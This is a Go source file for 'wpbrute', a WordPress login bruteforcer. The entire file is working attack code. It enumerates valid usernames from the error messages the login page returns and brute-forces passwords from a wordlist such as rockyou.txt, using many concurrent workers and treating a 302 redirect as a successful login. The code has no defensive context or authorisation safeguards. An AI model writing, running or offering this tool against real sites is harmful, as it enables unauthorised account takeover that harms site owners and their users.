package main

import (
	"bufio"
	"flag"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

// ---------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------

const (
	defaultTarget      = "http://localhost/wp-login.php"
	defaultConcurrency = 10
	defaultTimeout     = 10

	// WordPress error strings
	errBadUsername = "incorrect username"
	errBadPassword = "incorrect password"
	errUnknownUser = "unknown username"
)

// ---------------------------------------------------------------
// CLI flags
// ---------------------------------------------------------------

var (
	flagTarget      = flag.String("target", defaultTarget, "WordPress login URL")
	flagWordlist    = flag.String("w", "", "Path to wordlist file (required)")
	flagUsername    = flag.String("u", "", "Target username (password-only mode)")
	flagBoth        = flag.Bool("both", false, "Bruteforce username first, then password")
	flagConcurrency = flag.Int("c", defaultConcurrency, "Number of concurrent workers")
	flagTimeout     = flag.Int("t", defaultTimeout, "HTTP request timeout (seconds)")
	flagVerbose     = flag.Bool("v", false, "Verbose output")
)

// ---------------------------------------------------------------
// HTTP helpers
// ---------------------------------------------------------------

var httpClient *http.Client

func initClient(timeoutSec int) {
	httpClient = &http.Client{
		Timeout: time.Duration(timeoutSec) * time.Second,
		// Do NOT follow redirects — WP redirects on success
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

func postLogin(target, username, password string) (string, int, error) {
	data := url.Values{
		"log":         {username},
		"pwd":         {password},
		"wp-submit":   {"Log In"},
		"redirect_to": {"/wp-admin/"},
		"testcookie":  {"1"},
	}

	req, err := http.NewRequest("POST", target, strings.NewReader(data.Encode()))
	if err != nil {
		return "", 0, err
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; wpbrute/1.0)")
	// WordPress requires the test cookie to be set
	req.AddCookie(&http.Cookie{Name: "wordpress_test_cookie", Value: "WP+Cookie+check"})

	resp, err := httpClient.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", resp.StatusCode, err
	}
	return string(bodyBytes), resp.StatusCode, nil
}

// ---------------------------------------------------------------
// Decision helpers
// ---------------------------------------------------------------

func bodyLower(body string) string { return strings.ToLower(body) }

func isValidUsername(body string, status int) bool {
	b := bodyLower(body)
	if strings.Contains(b, errBadUsername) || strings.Contains(b, errUnknownUser) {
		return false
	}
	return true
}

func isValidPassword(body string, status int) bool {
	return status == 302
}

func loadWords(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var words []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		w := strings.TrimSpace(sc.Text())
		if w != "" {
			words = append(words, w)
		}
	}
	return words, sc.Err()
}

// ---------------------------------------------------------------
// Phase 1 – username enumeration
// ---------------------------------------------------------------

func enumerateUsernames(target string, words []string, concurrency int) []string {
	fmt.Printf("\n[*] Phase 1: Username enumeration (%d words, %d workers)\n", len(words), concurrency)

	jobs := make(chan string, concurrency*2)
	var found []string
	var mu sync.Mutex
	var wg sync.WaitGroup

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for word := range jobs {
				body, status, err := postLogin(target, word, "invalid_password_probe_xyz")
				if err != nil {
					if *flagVerbose {
						fmt.Printf("  [!] Error trying username %q: %v\n", word, err)
					}
					continue
				}
				if isValidUsername(body, status) {
					fmt.Printf("  [+] VALID USERNAME: %s\n", word)
					mu.Lock()
					found = append(found, word)
					mu.Unlock()
				} else if *flagVerbose {
					fmt.Printf("  [-] %s\n", word)
				}
			}
		}()
	}

	for _, w := range words {
		jobs <- w
	}
	close(jobs)
	wg.Wait()

	fmt.Printf("[*] Found %d valid username(s)\n", len(found))
	return found
}

// ---------------------------------------------------------------
// Phase 2 – password bruteforce
// ---------------------------------------------------------------

func brutePassword(target, username string, words []string, concurrency int) string {
	fmt.Printf("\n[*] Phase 2: Password bruteforce for %q (%d words, %d workers)\n",
		username, len(words), concurrency)

	jobs := make(chan string, concurrency*2)
	result := make(chan string, 1)
	done := make(chan struct{})
	var wg sync.WaitGroup

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-done:
					return
				case pwd, ok := <-jobs:
					if !ok {
						return
					}
					body, status, err := postLogin(target, username, pwd)
					if err != nil {
						if *flagVerbose {
							fmt.Printf("  [!] Error trying password %q: %v\n", pwd, err)
						}
						continue
					}
					if isValidPassword(body, status) {
						select {
						case result <- pwd:
							close(done)
						default:
						}
						return
					}
					if *flagVerbose {
						fmt.Printf("  [-] %s:%s\n", username, pwd)
					}
				}
			}
		}()
	}

	go func() {
		for _, w := range words {
			select {
			case <-done:
				for range words {
				}
				goto drainDone
			case jobs <- w:
			}
		}
	drainDone:
		close(jobs)
	}()

	wg.Wait()
	close(result)

	if pwd, ok := <-result; ok {
		fmt.Printf("  [+] FOUND PASSWORD for %q: %s\n", username, pwd)
		return pwd
	}
	fmt.Printf("  [-] Password not found for %q\n", username)
	return ""
}

// ---------------------------------------------------------------
// Main
// ---------------------------------------------------------------

func main() {
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, `wpbrute – WordPress login bruteforcer

Usage:
  go run wpbrute.go -both  -w rockyou.txt [-target URL] [-c N] [-t SEC] [-v]
  go run wpbrute.go -u admin -w rockyou.txt [-target URL] [-c N] [-t SEC] [-v]

Flags:
`)
		flag.PrintDefaults()
	}
	flag.Parse()

	// Validate flags
	if *flagWordlist == "" {
		fmt.Fprintln(os.Stderr, "[!] -w <wordlist> is required")
		flag.Usage()
		os.Exit(1)
	}
	if !*flagBoth && *flagUsername == "" {
		fmt.Fprintln(os.Stderr, "[!] Provide either -both (enumerate + crack) or -u <username> (crack only)")
		flag.Usage()
		os.Exit(1)
	}

	// Load wordlist
	words, err := loadWords(*flagWordlist)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[!] Cannot read wordlist: %v\n", err)
		os.Exit(1)
	}
	if len(words) == 0 {
		fmt.Fprintln(os.Stderr, "[!] Wordlist is empty")
		os.Exit(1)
	}

	initClient(*flagTimeout)

	fmt.Printf("[*] Target  : %s\n", *flagTarget)
	fmt.Printf("[*] Wordlist: %s (%d entries)\n", *flagWordlist, len(words))
	fmt.Printf("[*] Workers : %d\n", *flagConcurrency)

	start := time.Now()

	if *flagBoth {
		// Phase 1: enumerate usernames, then crack each one
		usernames := enumerateUsernames(*flagTarget, words, *flagConcurrency)
		if len(usernames) == 0 {
			fmt.Println("[!] No valid usernames found. Exiting.")
			os.Exit(0)
		}
		for _, u := range usernames {
			pwd := brutePassword(*flagTarget, u, words, *flagConcurrency)
			if pwd != "" {
				fmt.Printf("\n[✓] CREDENTIALS FOUND → %s : %s\n", u, pwd)
			}
		}
	} else {
		// Password-only mode
		pwd := brutePassword(*flagTarget, *flagUsername, words, *flagConcurrency)
		if pwd != "" {
			fmt.Printf("\n[✓] CREDENTIALS FOUND → %s : %s\n", *flagUsername, pwd)
		} else {
			fmt.Println("\n[✗] Password not found in wordlist.")
		}
	}

	fmt.Printf("\n[*] Done in %s\n", time.Since(start).Round(time.Second))
}
